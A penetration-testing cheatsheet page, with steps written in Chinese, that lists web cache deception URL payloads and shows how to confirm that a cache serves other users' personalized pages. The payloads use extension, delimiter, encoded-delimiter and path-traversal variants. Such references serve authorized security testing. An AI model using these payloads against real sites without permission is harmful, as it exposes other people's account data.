---
layout: page
title: Web Cache Deception Payload Cheatsheet
date: 2026-02-02
last_updated: 2026-02-02
tags: [WCD, caching, CDN, Web Security, cheatsheet]
---

## How to use

1. 選一個會回個人化/敏感資料的動態端點：`<TARGET>`
2. 套用下列 payload 產生「變形 URL」
3. 同一變形 URL 連送兩次：第二次要出現 `hit` / `Age` 變大 / 明顯變快
4. 驗證重點：同一變形 URL 取回的是「別人的個人化內容」才算 WCD

## Payload quick table

### Static extension cache rules

- `/<TARGET>/<JUNK>.css`
- `/<TARGET>/<JUNK>.js`
- `/<TARGET>/<JUNK>.png`

<div class="example">
  <ul>
    <li><code>/my-account/anything.css</code></li>
    <li><code>/profile/test.js</code></li>
    <li><code>/orders/x.png</code></li>
  </ul>
</div>

### Path mapping discrepancies

- `/<TARGET>/<JUNK>`
- `/<TARGET>/<JUNK>/<MORE>`

<div class="example">
  <ul>
    <li><code>/my-account/aaa</code></li>
    <li><code>/profile/this/looks/static</code></li>
  </ul>
</div>

### Delimiter discrepancies

- `/<TARGET>;<JUNK>.css`
- `/<TARGET>:<JUNK>.css`
- `/<TARGET>,<JUNK>.css`

<div class="example">
  <ul>
    <li><code>/my-account;anything.css</code></li>
    <li><code>/profile,foo.js</code></li>
    <li><code>/orders:test.png</code></li>
  </ul>
</div>

### Delimiter decoding discrepancies

- `/<TARGET>%23<JUNK>.css`（`%23` = `#`）
- `/<TARGET>%3b<JUNK>.css`（`%3b` = `;`）
- `/<TARGET>%3f<JUNK>.css`（`%3f` = `?`）

<div class="example">
  <ul>
    <li><code>/my-account%23anything.css</code></li>
    <li><code>/profile%3bfoo.js</code></li>
    <li><code>/orders%3ftest.png</code></li>
  </ul>
</div>

### Static directory cache rules

- `/static/..%2f<TARGET>`
- `/assets/..%2f<TARGET>`
- `/images/..%2f<TARGET>`

<div class="example">
  <ul>
    <li><code>/static/..%2fmy-account</code></li>
    <li><code>/assets/..%2fprofile</code></li>
    <li><code>/images/..%2forders</code></li>
  </ul>
</div>

### Normalization discrepancies

- `/<A>/..%2f<TARGET>`
- `/<A>/%2e%2e%2f<TARGET>`
- `/<A>/%2e%2e%2f%2e%2e%2f<TARGET>`

<div class="example">
  <ul>
    <li><code>/aaa/..%2fmy-account</code></li>
    <li><code>/x/%2e%2e%2fprofile</code></li>
    <li><code>/a/%2e%2e%2f%2e%2e%2forders</code></li>
  </ul>
</div>

### File name cache rules

- `/<TARGET>/<FILENAME>.css`
- `/<TARGET>/<FILENAME>.map`
- `/<TARGET>/<FILENAME>.ico`

<div class="example">
  <ul>
    <li><code>/my-account/app.css</code></li>
    <li><code>/profile/main.js.map</code></li>
    <li><code>/orders/favicon.ico</code></li>
  </ul>
</div>
